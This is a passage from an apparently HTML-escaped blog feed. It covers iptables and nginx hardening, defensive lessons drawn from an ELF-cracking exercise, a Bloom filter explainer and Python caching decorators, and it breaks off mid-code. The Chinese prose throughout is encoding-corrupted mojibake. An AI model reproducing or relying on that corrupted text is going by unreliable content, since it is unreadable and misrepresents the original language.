&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo iptables-restore &amp;lt; /etc/iptables.test.rules
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And see the difference:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">iptables -L
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Save the rules:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">iptables-save &amp;gt; /etc/iptables.up.rules
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Create file &lt;code>/etc/network/if-pre-up.d/iptables&lt;/code>, and add these lines to it:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/sh
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>/sbin/iptables-restore &amp;lt; /etc/iptables.up.rules
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Add executable permision for the file:&lt;/p>
&lt;p>&lt;code>chmod +x /etc/network/if-pre-up.d/iptables&lt;/code>&lt;/p>
&lt;p>To check who is listening on TCP port 12345:&lt;/p>
&lt;p>&lt;code>lsof -n -i4TCP:12345 | grep LISTEN&lt;/code>&lt;/p>
&lt;h2 id="nginx">nginx&lt;/h2>
&lt;p>Modify the file nginx.conf:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">http &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Hide nginx version information&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> server_tokens off&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Catch all requests with wrong host and return 444 status&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> server &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> listen &lt;span class="m">80&lt;/span> default_server&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> listen &lt;span class="o">[&lt;/span>::&lt;span class="o">]&lt;/span>:80 default_server&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> listen &lt;span class="m">443&lt;/span> ssl default_server&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> listen &lt;span class="o">[&lt;/span>::&lt;span class="o">]&lt;/span>:443 ssl default_server&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> 444&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></content><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/><category scheme="https://mincodes.com/tags/security/" term="Security" label="Security"/></entry><entry><title type="text">Security Tipsï¼šELF ç ´è§£åŠå‡ ç‚¹å¯ç¤º</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/security-tips-elf-hack/"/><id>https://mincodes.com/posts/security-tips-elf-hack/</id><updated>2022-12-04T13:02:00+00:00</updated><published>2022-12-04T11:44:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">å¦‚ä½•ç ´è§£ä¸€ä¸ª ELF æ–‡ä»¶ï¼šhackme: Deconstructing an ELF File å‡ ç‚¹å¯ç¤ºï¼š ç¼–è¯‘æ—¶è¦ä½¿ç”¨ strip é€‰é¡¹ é¿å…åœ¨ä»£ç ä¸­ä½¿ç”¨å­—ç¬¦ä¸²å¸¸é‡å­˜æ”¾â€¦</summary><content type="html">&lt;p>å¦‚ä½•ç ´è§£ä¸€ä¸ª ELF æ–‡ä»¶ï¼š&lt;a href="http://manoharvanga.com/hackme/">hackme: Deconstructing an ELF File&lt;/a>&lt;/p>
&lt;p>å‡ ç‚¹å¯ç¤ºï¼š&lt;/p>
&lt;ul>
&lt;li>ç¼–è¯‘æ—¶è¦ä½¿ç”¨ strip é€‰é¡¹&lt;/li>
&lt;li>é¿å…åœ¨ä»£ç ä¸­ä½¿ç”¨å­—ç¬¦ä¸²å¸¸é‡å­˜æ”¾æ•æ„Ÿä¿¡æ¯ï¼Œ&lt;code>strings&lt;/code> å·¥å…·å¯ä»¥è½»æ˜“ dump å‡ºæ¥&lt;/li>
&lt;li>åœ¨è°ƒç”¨åº“å‡½æ•°ã€ç³»ç»Ÿå‡½æ•°æ—¶ï¼Œé¿å…åœ¨å‚æ•°ä¸­ä¼ é€’æ˜æ–‡çš„æ•æ„Ÿä¿¡æ¯ï¼Œ &lt;code>ltrace&lt;/code>, &lt;code>strace&lt;/code> ç­‰å·¥å…·å¯ä»¥è½»æ˜“è°ƒè¯•å‡ºæ¥&lt;/li>
&lt;/ul>
&lt;p>å¦å¤–ï¼Œåœ¨Javaä»£ç ä¸­ï¼Œä¹Ÿè¦é¿å…ä½¿ç”¨æ˜æ–‡å­—ç¬¦ä¸²ä¿å­˜æ•æ„Ÿä¿¡æ¯ï¼Œå°¤å…¶æ˜¯ä¸è¦ç”¨ &lt;code>String&lt;/code> æ¥ä¿å­˜å¯†ç ï¼ŒåŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š&lt;/p>
&lt;ul>
&lt;li>String åœ¨ java ä¸­æ˜¯ä¸å¯å˜çš„ï¼Œè€Œä¸”ä¼šä¸€ç›´ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œç›´åˆ°åƒåœ¾æ”¶é›†å™¨å°†å…¶å›æ”¶ã€‚è€Œç”±äºå­—ç¬¦ä¸²è¢«æ”¾åœ¨å­—ç¬¦ä¸²ç¼“å†²æ± ä¸­ä»¥æ–¹ä¾¿é‡å¤ä½¿ç”¨ï¼Œæ‰€ä»¥å®ƒå°±å¯èƒ½åœ¨å†…å­˜ä¸­è¢«ä¿ç•™å¾ˆé•¿æ—¶é—´ï¼›&lt;/li>
&lt;li>å¦‚æœä½¿ç”¨ char [] æ¥ä¿å­˜å¯†ç ï¼Œåœ¨ç”¨å®Œä¹‹åå¯ä»¥ç«‹å³å°†å…¶ä¸­æ‰€æœ‰çš„å…ƒç´ æ¸…ç©ºã€‚æ‰€ä»¥å°†å¯†ç ä¿å­˜åˆ°å­—ç¬¦æ•°ç»„ä¸­å¾ˆæ˜æ˜¾çš„é™ä½äº†å¯†ç è¢«çªƒå–çš„é£é™©ï¼›&lt;/li>
&lt;/ul>
&lt;p>å‚è€ƒ &lt;a href="http://my.oschina.net/jasonultimate/blog/166968">ä¸ºä»€ä¹ˆä½¿ç”¨å­—ç¬¦æ•°ç»„ä¿å­˜å¯†ç æ¯”ä½¿ç”¨Stringä¿å­˜å¯†ç æ›´å¥½ï¼Ÿ&lt;/a>ã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/security/" term="Security" label="Security"/></entry><entry><title type="text">Bloom Filter å¸ƒéš†è¿‡æ»¤å™¨</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/bloom-filter/"/><id>https://mincodes.com/posts/bloom-filter/</id><updated>2022-12-04T13:05:00+00:00</updated><published>2022-12-04T11:11:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Bloom Filter æ˜¯ç”± Bloom åœ¨ 1970 å¹´æå‡ºçš„ä¸€ç§å¤šå“ˆå¸Œå‡½æ•°æ˜ å°„çš„å¿«é€ŸæŸ¥æ‰¾ç®—æ³•ã€‚ é€šå¸¸åº”ç”¨åœ¨ä¸€äº›éœ€è¦å¿«é€Ÿåˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦å±äºé›†â€¦</summary><content type="html">&lt;blockquote>
&lt;p>Bloom Filter æ˜¯ç”± Bloom åœ¨ 1970 å¹´æå‡ºçš„ä¸€ç§å¤šå“ˆå¸Œå‡½æ•°æ˜ å°„çš„å¿«é€ŸæŸ¥æ‰¾ç®—æ³•ã€‚&lt;br>
é€šå¸¸åº”ç”¨åœ¨ä¸€äº›éœ€è¦å¿«é€Ÿåˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦å±äºé›†åˆï¼Œä½†æ˜¯å¹¶ä¸ä¸¥æ ¼è¦æ±‚ 100% æ­£ç¡®çš„åœºåˆã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="hashmap-çš„é—®é¢˜">HashMap çš„é—®é¢˜&lt;/h2>
&lt;p>HashMap å…·æœ‰ O(1) çš„æŸ¥æ‰¾å¤æ‚åº¦ï¼Œä½†ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼šå†…å­˜åˆ©ç”¨ç‡ä¸é«˜ã€‚&lt;/p>
&lt;p>å¦‚æœéœ€è¦æŸ¥è¯¢çš„æ˜¯æµ·é‡æ•°æ®ï¼Œä½¿ç”¨ HashMap å°±å˜å¾—ä¸å¤ªç°å®ã€‚&lt;/p>
&lt;h2 id="bloom-filter">Bloom Filter&lt;/h2>
&lt;p>Bloom filter æ˜¯ä¸€ç§æ¦‚ç‡å‹æ•°æ®ç»“æ„ï¼Œå…·å¤‡å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š&lt;/p>
&lt;ul>
&lt;li>é«˜æ•ˆçš„æ’å…¥ã€æŸ¥è¯¢&lt;/li>
&lt;li>æé«˜çš„ç©ºé—´åˆ©ç”¨ç‡&lt;/li>
&lt;li>å¯ä»¥å‘Šè¯‰ä½ ï¼š&lt;em>æŸæ¡è®°å½•&lt;/em>&lt;em>&lt;strong>ä¸€å®šä¸å­˜åœ¨ï¼Œ&lt;strong>&lt;strong>æˆ–è€…&lt;/strong>&lt;/strong>æœ‰å¯èƒ½å­˜åœ¨&lt;/strong>&lt;/em>&lt;/li>
&lt;/ul>
&lt;h2 id="å®ç°åŸç†">å®ç°åŸç†&lt;/h2>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/cb93f59d-fcf0-4e3e-a4b0-0cc08403c235/Untitled.png" alt="">&lt;/p>
&lt;p>å¦‚ä¸Šå›¾ï¼Œbloom filter åº•å±‚ç»“æ„æ˜¯ä¸€ä¸ª bit æ•°ç»„ï¼ˆä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªï¼‰ã€‚&lt;/p>
&lt;ul>
&lt;li>
&lt;p>æ’å…¥ï¼šé‡‡ç”¨å¤šä¸ªç‹¬ç«‹çš„ hash å‡½æ•°ï¼Œåˆ†åˆ«è®¡ç®—è¯¥è®°å½•çš„ hash codeï¼Œå¹¶å°† hash code æ‰€æŒ‡å‘çš„ bit ä½è®¾ç½®ä¸º 1ï¼›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æŸ¥è¯¢ï¼šé‡‡ç”¨å¤šä¸ªç‹¬ç«‹çš„ hash å‡½æ•°ï¼Œåˆ†åˆ«è®¡ç®—è¯¥è®°å½•çš„ hash code&lt;/p>
&lt;ul>
&lt;li>å¦‚æœå…¶ä¸­æŸä¸ª hash code æŒ‡å‘çš„ bit ä½ â‰  1ï¼Œåˆ™è¯¥è®°å½•&lt;strong>ä¸€å®šä¸å­˜åœ¨&lt;/strong>ï¼›&lt;/li>
&lt;li>å¦‚æœæ¯ä¸ª hash code æŒ‡å‘çš„ bit ä½éƒ½ä¸º 1ï¼Œåˆ™è¯¥è®°å½•&lt;strong>å¯èƒ½å­˜åœ¨&lt;/strong>ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="ä½¿ç”¨åœºæ™¯">ä½¿ç”¨åœºæ™¯&lt;/h2>
&lt;p>ä¾‹å¦‚ï¼š&lt;/p>
&lt;ul>
&lt;li>æµè§ˆå™¨ç”¨æ¥å¿«é€Ÿç¡®å®šæŸä¸ª URL æ˜¯å¦å­˜åœ¨æœ¬åœ°ç¼“å­˜ï¼›&lt;/li>
&lt;li>çˆ¬è™«ç¨‹åºç”¨æ¥å¿«é€Ÿç¡®å®šæŸä¸ª URL æ˜¯å¦è¢«çˆ¬å–è¿‡ï¼›&lt;/li>
&lt;li>æœç´¢å¼•æ“ç”¨æ¥å¿«é€Ÿç¡®å®šæŸä¸ª URL æ˜¯å¦è¢«ç´¢å¼•è¿‡ã€‚&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/algorithm/" term="Algorithm" label="Algorithm"/></entry><entry><title type="text">Python Tips</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/python-tips/"/><id>https://mincodes.com/posts/python-tips/</id><updated>2022-12-04T13:38:00+00:00</updated><published>2022-12-03T10:40:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">å‡½æ•°å·¥å…· functools ç¼“å­˜ç±»è£…é¥°å™¨ @cache ç”¨äºè‡ªåŠ¨ç¼“å­˜å‡½æ•°çš„è¿”å›ç»“æœï¼ˆå³å…¶ä»–è¯­è¨€å¸¸è§çš„ memoizeï¼‰ã€‚ ä½¿ç”¨èµ·æ¥éå¸¸ç®€â€¦</summary><content type="html">&lt;h2 id="å‡½æ•°å·¥å…·-functools">å‡½æ•°å·¥å…· functools&lt;/h2>
&lt;h3 id="ç¼“å­˜ç±»è£…é¥°å™¨">ç¼“å­˜ç±»è£…é¥°å™¨&lt;/h3>
&lt;p>&lt;strong>&lt;code>@cache&lt;/code>&lt;/strong>&lt;/p>
&lt;p>ç”¨äºè‡ªåŠ¨ç¼“å­˜å‡½æ•°çš„è¿”å›ç»“æœï¼ˆå³å…¶ä»–è¯­è¨€å¸¸è§çš„ &lt;em>memoize&lt;/em>ï¼‰ã€‚&lt;/p>
&lt;p>ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œç»™å‡½æ•°å¢åŠ  &lt;code>@cache&lt;/code> è£…é¥°å™¨ï¼ˆDecoratorï¼‰å³å¯ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">functools&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">factorial&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">factorial&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">factorial&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># æ— ç¼“å­˜ç»“æœ, è§¦å‘ 11 æ¬¡é€’å½’è°ƒç”¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">3628800&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">factorial&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># ç›´æ¥è¿”å›ç¼“å­˜ç»“æœ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">120&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">factorial&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># è§¦å‘ 2 æ¬¡é€’å½’è°ƒç”¨, å…¶ä½™ 10 æ¬¡ç›´æ¥ä½¿ç”¨ç¼“å­˜çš„ç»“æœ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">479001600&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>ç”±äºç¼“å­˜æ˜¯é€šè¿‡å­—å…¸æ¥å®ç°çš„ï¼Œkey å°±æ˜¯å‡½æ•°çš„å‚æ•°ï¼Œæ‰€ä»¥ï¼Œå‚æ•°å¿…é¡»æ˜¯ &lt;em>hashable&lt;/em> çš„ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>é‚£å¦‚æœæƒ³ç¼“å­˜å±æ€§ï¼ˆpropertyï¼‰å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨ &lt;code>@property&lt;/code> åŸºç¡€ä¸Šï¼Œå åŠ ä¸€ä¸ª &lt;code>@cache&lt;/code> å³å¯ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">functools&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">statistics&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">DataSet&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sequence_of_numbers&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sequence_of_numbers&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@property&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@cache&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">stdev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">statistics&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>&lt;code>@cached_property&lt;/code>&lt;/strong>&lt;/p>
&lt;p>ä¸Šè¿°è¿™ä¸ªæ˜¯åªè¯»å±æ€§ï¼Œå¦‚æœæƒ³æ”¹æˆå¯å†™å±æ€§å‘¢ï¼Ÿfunctools è¿˜æä¾›äº†ä¸€ä¸ªå¯å†™çš„ç‰ˆæœ¬ &lt;code>@cached_property&lt;/code>ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">functools&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">cached_property&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">statistics&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">DataSet&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sequence_of_numbers&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sequence_of_numbers&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># è¯¥å±æ€§æ˜¯å¯å†™ç‰ˆæœ¬&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@cached_property&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">stdev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">statistics&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">stdev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_data&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>&lt;code>@lru_cache&lt;/code>&lt;/strong>&lt;/p>
&lt;p>å¦‚æœæƒ³é™åˆ¶ç¼“å­˜çš„ size å‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨ &lt;code>@lru_cache&lt;/code> ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># maxsize ä¸ºå¯é€‰å‚æ•°ï¼Œé»˜è®¤ä¸º 128&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@lru_cache&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">maxsize&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_pep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="p">):&lt;/span>
